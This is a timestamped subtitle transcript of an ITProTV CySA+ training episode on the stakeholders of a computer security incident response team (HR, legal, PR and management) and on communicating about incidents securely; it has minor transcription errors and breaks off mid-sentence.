--> 00:31:28.330\nSigning off for ITProTV,\nI've been your host Mike Rodrick.\n\n579\n00:31:28.330 -->

00:00:12.513\nwatching ITProTV.\n&gt;&gt; Hello,\n\n4\n00:00:12.513 --> 00:00:14.962\nwelcome to another exciting\nepisode here at ITProTV.\n\n5\n00:00:14.962 --> 00:00:16.346\nI'm your host, Mike Rodrick.\n\n6\n00:00:16.346 --> 00:00:19.086\nToday, we're doing our CySA+.\n\n7\n00:00:19.086 --> 00:00:24.430\nIn this episode, we'll be taking a look\nat CSIRT roles and communication.\n\n8\n00:00:24.430 --> 00:00:27.190\nHere with us in the studio is none\nother than Mr. Daniel Lowrie.\n\n9\n00:00:27.190 --> 00:00:28.993\nWelcome, Daniel.\n&gt;&gt; Well, glad to be back, Mike.\n\n10\n00:00:28.993 --> 00:00:31.980\nThanks for having me yet again,\nand thanks for joining us,\n\n11\n00:00:31.980 --> 00:00:34.020\nyou good folks out there as well.\n\n12\n00:00:34.020 --> 00:00:38.210\nYes, we are gonna take a look\nat CSIRT roles, functions,\n\n13\n00:00:38.210 --> 00:00:42.820\nand communications between\nthe members of those set rules.\n\n14\n00:00:42.820 --> 00:00:44.852\nThat's what we're trying to get at today.\n\n15\n00:00:44.852 --> 00:00:48.100\nAnd well, I guess, we'll start off\nwith some definitions and things.\n\n16\n00:00:48.100 --> 00:00:49.960\nThis is gonna be one of those definition-y\n\n17\n00:00:49.960 --> 00:00:51.190\ntype of shows.\n&gt;&gt; Right.\n\n18\n00:00:51.190 --> 00:00:53.388\n&gt;&gt; But we have to understand these things,\n\n19\n00:00:53.388 --> 00:00:56.695\nso that we can answer questions\nabout them or maybe a survey.\n\n20\n00:00:56.695 --> 00:00:57.868\n[LAUGH]\n&gt;&gt; Or an exam,\n\n21\n00:00:57.868 --> 00:00:58.368\n&gt;&gt; Yeah.\n\n22\n00:00:58.368 --> 00:00:59.447\n&gt;&gt; If you wanna get certified, right?\n\n23\n00:00:59.447 --> 00:01:00.724\n&gt;&gt; You never know.\n\n24\n00:01:00.724 --> 00:01:02.275\n&gt;&gt; Not to mention, in the real world,\n\n25\n00:01:02.275 --> 00:01:05.742\nif we're responsible for building up\nthese teams, we need to know who we need,\n\n26\n00:01:05.742 --> 00:01:08.780\nwhat roles we need to fill,\nwhat those responsibilities are.\n\n27\n00:01:08.780 --> 00:01:11.830\nCommunication paths, like you said,\nso lay it out for us, Daniel.\n\n28\n00:01:11.830 --> 00:01:13.233\nWhere do we start?\n&gt;&gt; Let's do it, great question.\n\n29\n00:01:13.233 --> 00:01:17.442\nI say, we start with just a little diagram\nthat I've whipped up here on my computer,\n\n30\n00:01:17.442 --> 00:01:21.117\nso that we can get some common ground\nhere, we all have something for our,\n\n31\n00:01:21.117 --> 00:01:23.759\nas our guiding star as we\nwalk through this process.\n\n32\n00:01:23.759 --> 00:01:27.080\nSo we've got two different\nsides of the coin here.\n\n33\n00:01:27.080 --> 00:01:29.437\nWe've got stakeholders and then,\nwe've got responsibilities.\n\n34\n00:01:29.437 --> 00:01:32.737\nWe're gonna start off with\nlooking at the stakeholders, and\n\n35\n00:01:32.737 --> 00:01:35.849\nthen we're gonna move into\nwhat responsibilities some of\n\n36\n00:01:35.849 --> 00:01:39.546\nthese people have to engage in,\nright, or that they might be doing.\n\n37\n00:01:39.546 --> 00:01:41.990\nWe'll also look at\nthe communications as well.\n\n38\n00:01:41.990 --> 00:01:45.220\nI don't have a slide for it,\nso I'll just talk about it.\n\n39\n00:01:45.220 --> 00:01:46.488\nSo let's start here.\n&gt;&gt; Communicate about it?\n\n40\n00:01:46.488 --> 00:01:47.824\n&gt;&gt; Yes, let's communicate it.\n\n41\n00:01:47.824 --> 00:01:48.845\nThat's right, good job.\n\n42\n00:01:48.845 --> 00:01:50.870\nAll right, so the stakeholders.\n\n43\n00:01:50.870 --> 00:01:53.860\nWe hammered the first one right\nthere with human resources.\n\n44\n00:01:53.860 --> 00:01:57.150\nWe've also got legal, marketing,\nand PR and management.\n\n45\n00:01:57.150 --> 00:01:59.070\nThese are all important stakeholders.\n\n46\n00:01:59.070 --> 00:02:01.350\nWhat do we mean when we say a stakeholder?\n\n47\n00:02:01.350 --> 00:02:04.510\nThese are the people inside of your\norganization that probably have\n\n48\n00:02:04.510 --> 00:02:08.900\nsome juice, they have some sway,\nthey are shot callers.\n\n49\n00:02:08.900 --> 00:02:13.263\nThey're important functionaries\ninside of your organization, right?\n\n50\n00:02:13.263 --> 00:02:15.643\nHR, obviously, very important, right?\n\n51\n00:02:15.643 --> 00:02:19.703\nThe person that runs the HR is typically\nsomeone with a lot of clout inside of\n\n52\n00:02:19.703 --> 00:02:23.828\nthe organization, because they are in\ncharge of the hiring and firing, and\n\n53\n00:02:23.828 --> 00:02:27.696\nthe day-to-day goings on with\nthe employees of the organization, so\n\n54\n00:02:27.696 --> 00:02:30.390\nthey are a very important aspect of that.\n\n55\n00:02:30.390 --> 00:02:35.717\nWe need to include someone from HR as part\nof our stakeholders in our CSIRT team,\n\n56\n00:02:35.717 --> 00:02:37.553\nif we are building one out.\n\n57\n00:02:37.553 --> 00:02:42.081\nAnd even if we're not making a proper\nCSIRT, we are making, which by the way,\n\n58\n00:02:42.081 --> 00:02:45.390\nstands for\nComputer Security Incidence Response Team.\n\n59\n00:02:45.390 --> 00:02:48.311\nSo these are the people that\nare gonna to come together,\n\n60\n00:02:48.311 --> 00:02:52.990\nan incident has occurred, the bat signal\ngoes up, who is it that answers that call?\n\n61\n00:02:52.990 --> 00:02:53.750\n&gt;&gt; These are those.\n\n62\n00:02:53.750 --> 00:02:55.230\n&gt;&gt; Right, these are those people.\n\n63\n00:02:55.230 --> 00:02:58.710\nSo it's a good idea, if you can get them,\n\n64\n00:02:58.710 --> 00:03:03.310\nto get someone from HR to be a part\nof that team that you're building.\n\n65\n00:03:03.310 --> 00:03:06.880\nBecause of, here's a good reason.\n\n66\n00:03:06.880 --> 00:03:10.160\nWhat if this incident involves unemployed?\n\n67\n00:03:11.500 --> 00:03:14.920\nIt's good to have someone\nwho handles hirings and\n\n68\n00:03:14.920 --> 00:03:19.840\nfirings, and reprimands,\nthings of that nature.\n\n69\n00:03:19.840 --> 00:03:21.870\nMaybe send somebody to\nsomething inadvertently and\n\n70\n00:03:21.870 --> 00:03:25.030\nthey just need to be talked to and say,\nhey, you're not allowed to do that,\n\n71\n00:03:25.030 --> 00:03:29.300\nyou access the sense of area of our\nnetworking and now, just to let you know,\n\n72\n00:03:29.300 --> 00:03:31.400\nthat's gonna go so\nstrike on your permanent record.\n\n73\n00:03:31.400 --> 00:03:36.790\nDon't be fiddling around, or they've\nactually become like an insider truth\n\n74\n00:03:36.790 --> 00:03:40.970\nthreat where they've acted as a bad actor,\na threat actor, and done something and\n\n75\n00:03:40.970 --> 00:03:45.610\nnow we must, maybe not only dismiss them,\nbut even get into the prosecution.\n\n76\n00:03:45.610 --> 00:03:48.553\nBut HR would be the person\nyou would wanna go to.\n\n77\n00:03:48.553 --> 00:03:50.027\n&gt;&gt; Yeah, cuz as an IT person,\n\n78\n00:03:50.027 --> 00:03:53.600\nI'm not familiar with all the rules,\nregulations, laws.\n\n79\n00:03:53.600 --> 00:03:57.680\nWe still have human rights to worry about,\ninnocent until proven guilty,\n\n80\n00:03:57.680 --> 00:03:58.600\nall that good stuff.\n\n81\n00:03:58.600 --> 00:04:01.220\nSo we have to make sure that we're\nfollowing the appropriate steps,\n\n82\n00:04:01.220 --> 00:04:04.050\nHR is the one to guide us through that.\n&gt;&gt; Exactly,\n\n83\n00:04:04.050 --> 00:04:08.420\nit's not our job as\nthe computer security people or\n\n84\n00:04:08.420 --> 00:04:13.510\njust the IT staff in general to be telling\nsomeone, you're fired, you're out of here.\n\n85\n00:04:13.510 --> 00:04:16.600\nThat's not our job, someone from\nHR will need to be doing that.\n\n86\n00:04:16.600 --> 00:04:20.930\nSo it's always why it's a good idea to\nhave someone from HR as one of your\n\n87\n00:04:20.930 --> 00:04:25.540\nstakeholders, someone who is like,\nI'm invested into instant response\n\n88\n00:04:25.540 --> 00:04:30.520\nin some way, shape or form, and\nI'm going to put my abilities and\n\n89\n00:04:30.520 --> 00:04:36.530\nresponsibilities into that if ever comes\naround, so you've gotta be aware of that.\n\n90\n00:04:36.530 --> 00:04:40.080\nHuman resources, while not a technical\naspect, they're not going to help out with\n\n91\n00:04:40.080 --> 00:04:45.090\nthe technical side of doing incident\nresponse, but they are very good\n\n92\n00:04:45.090 --> 00:04:48.650\nat dealing with the employee part, because\nthat's their job, it's what they do.\n\n93\n00:04:48.650 --> 00:04:49.688\nSo having them is a good idea.\n&gt;&gt; And\n\n94\n00:04:49.688 --> 00:04:52.729\ndo we have rights to go through\ntheir documents, their emails?\n\n95\n00:04:52.729 --> 00:04:55.527\nHR's gonna know that.\n&gt;&gt; That's exactly right, they're gonna\n\n96\n00:04:55.527 --> 00:04:59.091\nhave all that information, and so you'll\nwanna plug them as a resource, right?\n\n97\n00:04:59.091 --> 00:05:01.355\nSo let's go into legal.\n\n98\n00:05:01.355 --> 00:05:07.014\nIf you have a standing legal staff, that's\namazing, cuz that means you've done very\n\n99\n00:05:07.014 --> 00:05:12.439\nwell for your company and it is doing very\nwell, because once you get large enough,\n\n100\n00:05:12.439 --> 00:05:18.050\nyou are going to eventually encounter some\nsort of legal aspect in your environment.\n\n101\n00:05:18.050 --> 00:05:20.000\nWhen it comes to an incident,\n\n102\n00:05:20.000 --> 00:05:24.602\nthat could be a very important stakeholder\nto have on your emergency response team.\n\n103\n00:05:24.602 --> 00:05:29.920\nAgain, not technical people,\nusually as far as IT goes or\n\n104\n00:05:29.920 --> 00:05:35.155\nsecurity, but they understand the law, the\nlegal aspects and ramifications, they're\n\n105\n00:05:35.155 --> 00:05:39.700\ngonna be able to help out a lot when\nit comes to the gathering of evidence.\n\n106\n00:05:39.700 --> 00:05:42.579\nAre we doing it in a way that's going to\nmaintain the integrity of the evidence\n\n107\n00:05:42.579 --> 00:05:43.519\nthat we're gathering?\n\n108\n00:05:43.519 --> 00:05:45.760\nThey're gonna be able\nto help us with that.\n\n109\n00:05:45.760 --> 00:05:48.420\nHas any laws been violated,\nare we in violation?\n\n110\n00:05:48.420 --> 00:05:51.600\nEven though we may be the person\nthat's been compromised,\n\n111\n00:05:51.600 --> 00:05:55.970\nmaybe they've made all the workstations\nin our network a botnet,\n\n112\n00:05:55.970 --> 00:06:01.000\nand they've attacked another system,\nhow are we culpable in any way, are we?\n\n113\n00:06:01.000 --> 00:06:03.492\nWe don't know, legal can help you\nout with these types of things.\n\n114\n00:06:03.492 --> 00:06:08.517\nSo again, while not technical, it's\na really good idea to have someone from\n\n115\n00:06:08.517 --> 00:06:13.820\nlegal as a stakeholder inside of your\nCSIRT when you're building that up.\n\n116\n00:06:13.820 --> 00:06:17.856\nGet them on the board, so\nwhen something occurs, they can be\n\n117\n00:06:17.856 --> 00:06:22.843\nadvising us right out of the gates on\nwhat is going to be selling practices,\n\n118\n00:06:22.843 --> 00:06:27.117\nor what are the ramifications,\nwhat are we need to be doing, and\n\n119\n00:06:27.117 --> 00:06:31.310\nif you don't have a legal staff on,\non staff, you can always,\n\n120\n00:06:31.310 --> 00:06:35.631\nat that point, hire someone who\nspecializes in IT law, right?\n\n121\n00:06:35.631 --> 00:06:37.221\nThat'll be a good idea, right?\n\n122\n00:06:37.221 --> 00:06:39.090\nLet's see here.\n\n123\n00:06:39.090 --> 00:06:42.740\nMoving on,\nlet's take a look at marketing and PR.\n\n124\n00:06:42.740 --> 00:06:45.663\nAgain, not technical people, right, but\n\n125\n00:06:45.663 --> 00:06:49.180\nhopefully, you're seeing the importance\nof each one of these people,\n\n126\n00:06:49.180 --> 00:06:52.580\nalthough they don't bring\na technical expertise into the mix.\n\n127\n00:06:52.580 --> 00:06:56.080\nIt's always a good idea to have them as\nstakeholders, cuz they have that juice.\n\n128\n00:06:56.080 --> 00:06:57.021\n&gt;&gt; Yeah, absolutely.\n\n129\n00:06:57.021 --> 00:07:00.120\nThese are the people that\nare gonna be doing press releases,\n\n130\n00:07:00.120 --> 00:07:02.326\ntalking to reporters, things like that.\n\n131\n00:07:02.326 --> 00:07:04.500\nI don't know what to say.\n\n132\n00:07:04.500 --> 00:07:08.896\nWhat we can say, should we say anything,\nshould we make this public HR, I mean,\n\n133\n00:07:08.896 --> 00:07:13.165\nnot HR, but marketing, PR, those are gonna\nbe the ones that know how to handle\n\n134\n00:07:13.165 --> 00:07:16.520\nthat publicly if we need to.\n&gt;&gt; Right, they're very, very good at that.\n\n135\n00:07:16.520 --> 00:07:20.660\nTheir whole purpose is,\nsometimes it's to spin,\n\n136\n00:07:20.660 --> 00:07:24.800\nthat's just the cold, hard truth of it,\nit's to make us look not\n\n137\n00:07:24.800 --> 00:07:28.677\nas bad as possible if something did occur.\n&gt;&gt; I know what they're gonna say.\n\n138\n00:07:28.677 --> 00:07:31.034\nThe first thing they're gonna say is,\n\n139\n00:07:31.034 --> 00:07:35.520\nwe at Company XYZ really take your\nprivacy and security seriously.\n\n140\n00:07:35.520 --> 00:07:38.720\nWe promise this won't happen again.\n&gt;&gt; Again.\n\n141\n00:07:38.720 --> 00:07:40.390\n&gt;&gt; [LAUGH]\n\n142\n00:07:40.390 --> 00:07:41.150\n&gt;&gt; Who do we kid?\n\n143\n00:07:41.150 --> 00:07:44.058\nMike, it seems like you've heard\nsome of these statements before.\n\n144\n00:07:44.058 --> 00:07:45.772\n&gt;&gt; All you've gotta do is open up any\n\n145\n00:07:45.772 --> 00:07:47.181\none of your news feeders and\n\n146\n00:07:47.181 --> 00:07:51.055\nyou will see this kind of commenting\ngoing on with every breach that we see.\n\n147\n00:07:51.055 --> 00:07:54.713\nBut, it is important to understand\nthat they do have people in place,\n\n148\n00:07:54.713 --> 00:07:57.751\nwriting that,\nunderstanding what it is they need to say,\n\n149\n00:07:57.751 --> 00:08:01.967\nto try to save customers, to try to save\nthe organization If it's gone that far.\n\n150\n00:08:01.967 --> 00:08:03.637\n&gt;&gt; Right, and you know what?\n\n151\n00:08:03.637 --> 00:08:05.977\nThe very fact of the matter is they may\nhave been doing their due diligence.\n\n152\n00:08:05.977 --> 00:08:06.578\n&gt;&gt; Mm-hm.\n\n153\n00:08:06.578 --> 00:08:08.089\n&gt;&gt; And even if they're not,\n\n154\n00:08:08.089 --> 00:08:10.708\nthat's gonna come out in an investigation.\n\n155\n00:08:10.708 --> 00:08:11.981\nAnd then marketing and\n\n156\n00:08:11.981 --> 00:08:16.730\nPR is going to try to handle any fallout\nthat comes from that, that is their job.\n\n157\n00:08:16.730 --> 00:08:20.010\nAnd if you have a company,\nyou probably wanna keep it above water.\n\n158\n00:08:20.010 --> 00:08:24.290\nAnd a data breach or\nsome sort of incident could be\n\n159\n00:08:24.290 --> 00:08:28.640\nthe volley across the mast that takes\nthat ship down below the depths, right?\n\n160\n00:08:28.640 --> 00:08:29.730\nWe don't want that.\n\n161\n00:08:29.730 --> 00:08:32.849\nMarketing, PR,\nit is their job to handle that.\n\n162\n00:08:32.849 --> 00:08:37.103\nIt is their job to be able to speak,\nput the word out on.\n\n163\n00:08:37.103 --> 00:08:40.379\nWe are either rectifying\nthe situation as soon as possible.\n\n164\n00:08:40.379 --> 00:08:41.609\nWe're doing everything we can.\n\n165\n00:08:41.609 --> 00:08:44.130\nAnd hopefully that's the truth, but\n\n166\n00:08:44.130 --> 00:08:47.609\nthey're really good at\nbasically being that face.\n\n167\n00:08:47.609 --> 00:08:51.270\nAnd the other person that could be that\nface is, well, is management, right?\n\n168\n00:08:51.270 --> 00:08:56.593\nThey could also fall under this\nrole as the person who comes up.\n\n169\n00:08:56.593 --> 00:09:00.202\nDepends on really the level of\ndevastation of the incident\n\n170\n00:09:00.202 --> 00:09:02.741\nusually.\n&gt;&gt; And what you don't want is that lower\n\n171\n00:09:02.741 --> 00:09:05.729\nlevel IT person that happens to\nget in front of the camera, and\n\n172\n00:09:05.729 --> 00:09:07.576\nthey're going, it's awful.\n&gt;&gt; [LAUGH]\n\n173\n00:09:07.576 --> 00:09:09.409\n&gt;&gt; I think we've lost everything,\n\n174\n00:09:09.409 --> 00:09:13.110\ncredit card numbers, usernames,\neverything is out there.\n\n175\n00:09:13.110 --> 00:09:15.360\nAll right, that's what you wanna avoid.\n&gt;&gt; Yeah, exactly.\n\n176\n00:09:15.360 --> 00:09:20.300\nSo their role is to come out and\nshow that, okay, I'm part of\n\n177\n00:09:20.300 --> 00:09:26.220\nthe management of this corporation or\nthis organization, whatever case is.\n\n178\n00:09:26.220 --> 00:09:32.890\nAnd they do that to let you\nknow the seriousness of it.\n\n179\n00:09:32.890 --> 00:09:35.095\nThis isn't just a marketing\nguy that's coming out here,\n\n180\n00:09:35.095 --> 00:09:36.228\ntrying to make it sound good.\n\n181\n00:09:36.228 --> 00:09:39.940\nI am management, I'm coming here\nto say we are working hard.\n\n182\n00:09:39.940 --> 00:09:41.417\nThey can be that face.\n\n183\n00:09:41.417 --> 00:09:46.484\nThey can also, because of their\nmanagement status, authorize this, right?\n\n184\n00:09:46.484 --> 00:09:48.357\nMaybe an incident has occurred.\n\n185\n00:09:48.357 --> 00:09:52.017\nI need to get authorization to do x, y,\nor z, I can't just go off the handle.\n\n186\n00:09:52.017 --> 00:09:55.228\nNow, I might already be authorized\nwith inside a policy, but\n\n187\n00:09:55.228 --> 00:09:58.520\nultimately a manager\nhad to authorize this.\n\n188\n00:09:58.520 --> 00:10:03.170\nSo getting specific types of\nauthorization is going to be a necessity.\n\n189\n00:10:03.170 --> 00:10:07.277\nSo we're going to need someone in\na management role to be able to\n\n190\n00:10:07.277 --> 00:10:12.158\nhave the clout necessary to authorize\nthe things that we are going to need,\n\n191\n00:10:12.158 --> 00:10:18.140\nspending of money, the hiring of outside\nspecialists, bringing in law enforcement.\n\n192\n00:10:18.140 --> 00:10:25.790\nWhatever the case is, that's not our role\nas IT or as the head of the CSIRT, right?\n\n193\n00:10:25.790 --> 00:10:31.568\nOur job is to say here's what we\nneed based off my expert opinion,\n\n194\n00:10:31.568 --> 00:10:33.679\nmy expert experience.\n\n195\n00:10:33.679 --> 00:10:36.341\nThis is what we're gonna need and\nthen the manager signs off on it.\n\n196\n00:10:36.341 --> 00:10:39.839\nIf you don't have a manager on your CSIRT,\nyou're gonna wanna go ahead and\n\n197\n00:10:39.839 --> 00:10:41.192\nwrite one of those in there.\n\n198\n00:10:41.192 --> 00:10:44.350\nSo that you can get somebody in there\nthat'll have the ability to say yea or\n\n199\n00:10:44.350 --> 00:10:49.050\nnay, and authorize the different\nthings that we need.\n\n200\n00:10:49.050 --> 00:10:50.520\nLet's see here, anything else?\n\n201\n00:10:50.520 --> 00:10:51.560\nOkay, suspending.\n\n202\n00:10:51.560 --> 00:10:56.288\nThey also might make statements, like\nI said, to television or news outlets,\n\n203\n00:10:56.288 --> 00:10:59.126\nthat kind of thing,\ndepending on the fallout.\n\n204\n00:10:59.126 --> 00:11:03.044\nThey'll also probably work very\nclosely with the law enforcement.\n\n205\n00:11:03.044 --> 00:11:05.239\nThey're also gonna tell us what we can and\ncannot divulge.\n\n206\n00:11:05.239 --> 00:11:10.380\nMaybe we've been compromised,\nand it is a criminal act.\n\n207\n00:11:10.380 --> 00:11:14.200\nA criminal act has occurred, but\nwe don't wanna divulge that.\n\n208\n00:11:14.200 --> 00:11:16.783\nWe have to get authorization\nfrom management and\n\n209\n00:11:16.783 --> 00:11:19.366\nsay we have to bring in law enforcement,\nright?\n\n210\n00:11:19.366 --> 00:11:20.672\nSo that's another thing.\n\n211\n00:11:20.672 --> 00:11:23.597\nSo they might be the go-between\nto law enforcement and yourself.\n\n212\n00:11:23.597 --> 00:11:26.273\nIt can be a little bit of a hinderance\nto the investigation, but\n\n213\n00:11:26.273 --> 00:11:29.590\nit could be a fact of life,\nyou just gotta remember that.\n\n214\n00:11:29.590 --> 00:11:33.376\nThey might not want you to get the law\nenforcement involved just to keep it\n\n215\n00:11:33.376 --> 00:11:33.882\nhushed.\n\n216\n00:11:33.882 --> 00:11:36.725\nThere was only the compromise\nhas occurred, but\n\n217\n00:11:36.725 --> 00:11:39.228\nno data that could be seen as exfiltrated.\n\n218\n00:11:39.228 --> 00:11:43.556\nA lot of times people will do this to\nmake sure their stock doesn't go down,\n\n219\n00:11:43.556 --> 00:11:44.939\nthings of that nature.\n\n220\n00:11:44.939 --> 00:11:48.059\nThey have stakeholders of their own\nthat they have to look out for and\n\n221\n00:11:48.059 --> 00:11:50.298\nthey're called stockholders.\n&gt;&gt; [LAUGH]\n\n222\n00:11:50.298 --> 00:11:51.678\n&gt;&gt; A board of directors and\n\n223\n00:11:51.678 --> 00:11:53.340\nthings of that nature.\n\n224\n00:11:53.340 --> 00:11:54.257\nWhat is the problem?\n\n225\n00:11:54.257 --> 00:11:56.800\nSo getting that authorization,\n\n226\n00:11:56.800 --> 00:12:01.610\nhaving their push on your side as\na CSIRT will be influential and\n\n227\n00:12:01.610 --> 00:12:06.690\nkey, critical when it comes\nto building up that team.\n\n228\n00:12:06.690 --> 00:12:08.670\nAll right, let's talk about\ncommunication a little bit.\n\n229\n00:12:08.670 --> 00:12:10.795\nWe've worked our way through\nthe different stakeholders.\n\n230\n00:12:10.795 --> 00:12:15.328\nHopefully, you have seen the importance of\nhaving each one of those types of people\n\n231\n00:12:15.328 --> 00:12:17.609\non your stakeholders team in your CSIRT.\n\n232\n00:12:17.609 --> 00:12:21.794\nSo let's talk about communication,\nhow do we talk about these things?\n\n233\n00:12:21.794 --> 00:12:28.460\nHow do we relay information from one\nperson in the CSIRT to the other?\n\n234\n00:12:28.460 --> 00:12:30.160\nWell, that's a really good question.\n\n235\n00:12:30.160 --> 00:12:33.335\nIt must be done in a very,\nwhat's the word?\n\n236\n00:12:33.335 --> 00:12:35.470\nI wanna say pointed and directed way.\n\n237\n00:12:35.470 --> 00:12:37.950\nWe don't want to just, hey,\nI'm gonna shoot Bob an email.\n\n238\n00:12:37.950 --> 00:12:39.970\nHere's all the stuff that happened.\n\n239\n00:12:39.970 --> 00:12:42.710\nWell, is that going over\na secure line as did you\n\n240\n00:12:42.710 --> 00:12:45.345\ncc anybody on that probably\ndidn't need to know about this?\n\n241\n00:12:45.345 --> 00:12:48.585\nThese are things that we\nneed to start thinking about\n\n242\n00:12:48.585 --> 00:12:53.335\nwhen it comes to the communication of\nthe details of incident response, okay?\n\n243\n00:12:53.335 --> 00:12:57.534\nSo let's go into one of the things we want\nto do is limit communications between\n\n244\n00:12:57.534 --> 00:12:58.562\nparties, right?\n\n245\n00:12:58.562 --> 00:13:05.054\nWhen I say parties,\nI limit it to trusted parties, right?\n\n246\n00:13:05.054 --> 00:13:09.755\nSo like I just said, you don't want\nto include, Mike is over here,\n\n247\n00:13:09.755 --> 00:13:11.906\nhe's just a help desk worker.\n\n248\n00:13:11.906 --> 00:13:15.290\nAnd I'm like, well, Mike might be helpful,\nI'm gonna send him the details of that.\n\n249\n00:13:15.290 --> 00:13:16.821\nHe's not a part of that team.\n\n250\n00:13:16.821 --> 00:13:22.210\nAnd until you got authorization\nfrom management to bring him in as\n\n251\n00:13:22.210 --> 00:13:26.200\nmaybe someone to be an extra set of hands,\nan extra set of eyes, or whatever.\n\n252\n00:13:26.200 --> 00:13:27.960\nHe is not a part of the trusted crew yet.\n\n253\n00:13:27.960 --> 00:13:33.470\nUntil he's on the inner circle, don't\nsend him messages, don't send him emails.\n\n254\n00:13:33.470 --> 00:13:38.054\nAll right, so don't tell your mom and your\nbrother about, man, we had this real bad\n\n255\n00:13:38.054 --> 00:13:40.620\nthing go down at work today.\n&gt;&gt; [LAUGH] Yeah.\n\n256\n00:13:40.620 --> 00:13:42.497\n&gt;&gt; [COUGH] Don't tell them about it.\n\n257\n00:13:42.497 --> 00:13:44.068\nThis is all hush-hush stuff.\n\n258\n00:13:44.068 --> 00:13:46.871\nThis is all need to know kind of things,\nokay?\n\n259\n00:13:46.871 --> 00:13:50.160\nSo if they don't need to know,\nthen they don't need to know, okay?\n\n260\n00:13:50.160 --> 00:13:53.480\nSo only communicate\nbetween trusted parties.\n\n261\n00:13:53.480 --> 00:13:57.740\nThe other disclosure, let's talk about\ndisclosure based on regulatory or\n\n262\n00:13:57.740 --> 00:14:00.740\nlegislative principles.\n\n263\n00:14:00.740 --> 00:14:04.160\nSo maybe you have regulatory\nguidelines that say,\n\n264\n00:14:04.160 --> 00:14:07.111\nhere is how you communicate specifically.\n\n265\n00:14:07.111 --> 00:14:10.167\nThis is when we're talking\nusually government agencies or\n\n266\n00:14:10.167 --> 00:14:13.589\nanything that's, payment cards,\nall the typical things you can\n\n267\n00:14:13.589 --> 00:14:17.515\nthink of when it comes to something\nthat has a regulation pushing behind it.\n\n268\n00:14:17.515 --> 00:14:21.132\nOr legislation saying,\ndon't keep unencrypted emails or\n\n269\n00:14:21.132 --> 00:14:24.172\nsend unencrypted emails\nbetween these parties,\n\n270\n00:14:24.172 --> 00:14:28.894\nbecause it's going across an unencrypted\narea and it could be intercepted.\n\n271\n00:14:28.894 --> 00:14:30.254\nSo they'll put out there,\n\n272\n00:14:30.254 --> 00:14:33.862\nthis is how you send information from\npoint A to point B so that you can do it\n\n273\n00:14:33.862 --> 00:14:37.207\nin a secure and forensically sound way.\n&gt;&gt; And\n\n274\n00:14:37.207 --> 00:14:40.629\nit's where legal might come back\ninto play to, cuz they can tell us,\n\n275\n00:14:40.629 --> 00:14:44.346\ndo we have an obligation like, well,\nnone of the customer information was\n\n276\n00:14:44.346 --> 00:14:47.724\nreleased so do we have an obligation\nto notify all of our customers?\n\n277\n00:14:47.724 --> 00:14:50.873\nOr can we keep this in house and\nnot notify?\n\n278\n00:14:50.873 --> 00:14:55.367\nOr are there business partners we're\nconnected to networking-wise that we might\n\n279\n00:14:55.367 --> 00:14:56.720\nneed to notify legally?\n\n280\n00:14:56.720 --> 00:15:01.042\nOr we can get trouble if something happens\nto them, and we knew about it a week ago,\n\n281\n00:15:01.042 --> 00:15:04.352\nhours ago, whatever the case may be?\n&gt;&gt; Exactly, exactly.\n\n282\n00:15:04.352 --> 00:15:09.191\nI think that, again, goes back to showing\nyou how important having someone from\n\n283\n00:15:09.191 --> 00:15:10.623\nlegal in your CSIRT is.\n\n284\n00:15:10.623 --> 00:15:15.401\nSo just having all those expert\npeople plus their ability to have\n\n285\n00:15:15.401 --> 00:15:17.976\nsway inside of the organization.\n\n286\n00:15:17.976 --> 00:15:21.356\nIt all starts culminating and you start\nseeing that importance over and over and\n\n287\n00:15:21.356 --> 00:15:21.916\nover again.\n\n288\n00:15:21.916 --> 00:15:24.666\nLet's talk about prevent\ninadvertent release of information,\n\n289\n00:15:24.666 --> 00:15:26.530\nkinda talked about this a little bit.\n\n290\n00:15:26.530 --> 00:15:29.570\nDon't send this to anyone\nthat you don't trust and\n\n291\n00:15:29.570 --> 00:15:32.310\ndon't do it in an untrusted way,\nall right?\n\n292\n00:15:32.310 --> 00:15:36.830\nSo we don't want to inadvertently,\nI sent it to that email list I've got.\n\n293\n00:15:36.830 --> 00:15:39.860\nI didn't realize Mike was on\nthat list when I sent it.\n\n294\n00:15:39.860 --> 00:15:43.370\nI forgot he's on there, so\nI've inadvertently sent that.\n\n295\n00:15:43.370 --> 00:15:47.870\nSo always verify the recipients\nof any communications,\n\n296\n00:15:47.870 --> 00:15:50.360\nwhether it be through phone,\ntext, email, whatever.\n\n297\n00:15:51.760 --> 00:15:56.139\nVerify that the endpoints that are\nreceiving it are the endpoints in which\n\n298\n00:15:56.139 --> 00:15:59.393\nyou intend to receive it and\nthere's no inadvertent.\n\n299\n00:15:59.393 --> 00:16:03.333\nAlways use encryption if at all possible\nwhen you're sending digital information\n\n300\n00:16:03.333 --> 00:16:05.875\nout there,\ncuz you don't want it to be intercepted.\n\n301\n00:16:05.875 --> 00:16:09.208\nWe've seen the dangers of\nplain text communications that\n\n302\n00:16:09.208 --> 00:16:12.405\nanyone with the wherewithal\nto attach to the network and\n\n303\n00:16:12.405 --> 00:16:16.690\nreceive those data packets could possibly\nlook into those data packets and\n\n304\n00:16:16.690 --> 00:16:21.460\nsee the information has been sent and\nwho knows what they would do with that.\n\n305\n00:16:21.460 --> 00:16:24.060\nWe see it all the time, leaks happen.\n\n306\n00:16:24.060 --> 00:16:27.390\nRight, this is why you have a leak,\nthat's why I call it a leak,\n\n307\n00:16:27.390 --> 00:16:30.660\nis they're not inadvertently\nselling things out but\n\n308\n00:16:30.660 --> 00:16:33.050\nyou have inadvertently given\nthem the ability to leak it out.\n\n309\n00:16:33.050 --> 00:16:37.290\nSo, just try to keep everything as\nclose to the vest as possible and\n\n310\n00:16:37.290 --> 00:16:39.560\nbetween the right people as possible.\n\n311\n00:16:39.560 --> 00:16:43.310\nAgain, secure methods of communications,\nmake sure that they are tested,\n\n312\n00:16:43.310 --> 00:16:47.150\nthat you actually tested\nthe lines that you've approved or\n\n313\n00:16:47.150 --> 00:16:51.130\ncommunicating between trusted entities,\ntest that out and\n\n314\n00:16:51.130 --> 00:16:55.440\nverify that if someone were to try to\nintercept that, they would be right?\n\n315\n00:16:55.440 --> 00:16:58.204\nMake sure that it actually works, right?\n\n316\n00:16:58.204 --> 00:17:02.645\n[LAUGH] That I was able to send\na message between Mike and\n\n317\n00:17:02.645 --> 00:17:04.785\nmyself if that's who I'm\nsending something to.\n\n318\n00:17:04.785 --> 00:17:05.885\nHe was able to receive it.\n\n319\n00:17:05.885 --> 00:17:07.955\nHe was able to decrypt it, read it and\n\n320\n00:17:07.955 --> 00:17:11.255\ngather information [INAUDIBLE]\nable to work with it.\n\n321\n00:17:11.255 --> 00:17:14.825\nAlso, document it and\nmake it a policy, right?\n\n322\n00:17:14.825 --> 00:17:18.085\nSo document how the 